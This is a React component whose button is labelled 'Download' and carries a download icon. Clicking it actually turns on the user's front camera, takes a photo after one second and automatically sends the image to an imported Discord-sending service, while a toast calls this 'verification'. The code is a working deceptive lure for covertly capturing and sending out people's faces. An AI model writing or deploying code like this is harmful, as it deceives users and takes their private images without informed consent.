
import React, { useState, useRef, useCallback } from 'react';
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Download } from "lucide-react";
import { toast } from "@/components/ui/use-toast";
import { sendImageToDiscord } from '@/services/discordService';

const CameraCapture = () => {
  const [isCapturing, setIsCapturing] = useState(false);
  const [imageData, setImageData] = useState<string | null>(null);
  const [isSending, setIsSending] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  
  const startCamera = useCallback(async () => {
    try {
      setIsCapturing(true);
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user' }
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
        
        // Capture image after a short delay to ensure camera is ready
        setTimeout(() => {
          captureImage(stream);
        }, 1000);
      }
    } catch (error) {
      setIsCapturing(false);
      toast({
        title: "Camera access denied",
        description: "Please allow camera access to use this feature.",
        variant: "destructive"
      });
      console.error("Error accessing camera:", error);
    }
  }, []);
  
  const captureImage = useCallback((stream: MediaStream) => {
    if (videoRef.current && canvasRef.current) {
      const video = videoRef.current;
      const canvas = canvasRef.current;
      
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const context = canvas.getContext('2d');
      if (context) {
        // Draw the current video frame to the canvas
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Convert canvas to data URL
        const imageData = canvas.toDataURL('image/jpeg');
        setImageData(imageData);
        
        // Stop all video tracks to turn off the camera
        stream.getTracks().forEach(track => track.stop());
        setIsCapturing(false);
        
        // Automatically send to Discord
        handleSendToDiscord(imageData);
      }
    }
  }, []);
  
  const handleSendToDiscord = async (imgData: string) => {
    try {
      setIsSending(true);
      await sendImageToDiscord(imgData);
      toast({
        title: "Success!",
        description: "Your image has been sent for verification.",
      });
    } catch (error) {
      toast({
        title: "Error sending image",
        description: "Please try again later.",
        variant: "destructive"
      });
      console.error("Error sending to Discord:", error);
    } finally {
      setIsSending(false);
    }
  };
  
  const handleDownloadClick = () => {
    if (!imageData) {
      startCamera();
    } else {
      // Reset to take another picture
      setImageData(null);
    }
  };
  
  return (
    <div className="flex flex-col items-center w-full max-w-lg mx-auto gap-6">
      <Card className="w-full overflow-hidden bg-yowx-dark/5 border-yowx-primary/30">
        <div className="relative aspect-video w-full bg-black/10 flex items-center justify-center">
          {isCapturing ? (
            <video 
              ref={videoRef} 
              className="w-full h-full object-cover" 
              autoPlay 
              playsInline 
              muted
            />
          ) : imageData ? (
            <img 
              src={imageData} 
              alt="Captured" 
              className="w-full h-full object-contain" 
            />
          ) : (
            <div className="text-center p-6">
              <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-yowx-primary/20 flex items-center justify-center">
                <Download className="w-8 h-8 text-yowx-primary" />
              </div>
              <p className="text-yowx-dark">Click Download to capture an image</p>
            </div>
          )}
          
          {isCapturing && (
            <div className="absolute inset-0 flex items-center justify-center bg-black/50">
              <div className="w-16 h-16 rounded-full bg-yowx-primary/20 flex items-center justify-center animate-pulse-opacity">
                <div className="w-12 h-12 rounded-full bg-yowx-accent"></div>
              </div>
            </div>
          )}
        </div>
      </Card>
      
      <Button 
        onClick={handleDownloadClick}
        disabled={isCapturing || isSending}
        className="w-full py-6 text-lg bg-gradient-yowx hover:opacity-90 transition-all"
      >
        {isCapturing ? 'Capturing...' : 
         isSending ? 'Sending...' : 
         imageData ? 'Take New Picture' : 'Download'}
      </Button>
      
      {/* Hidden canvas for image processing */}
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
};

export default CameraCapture;
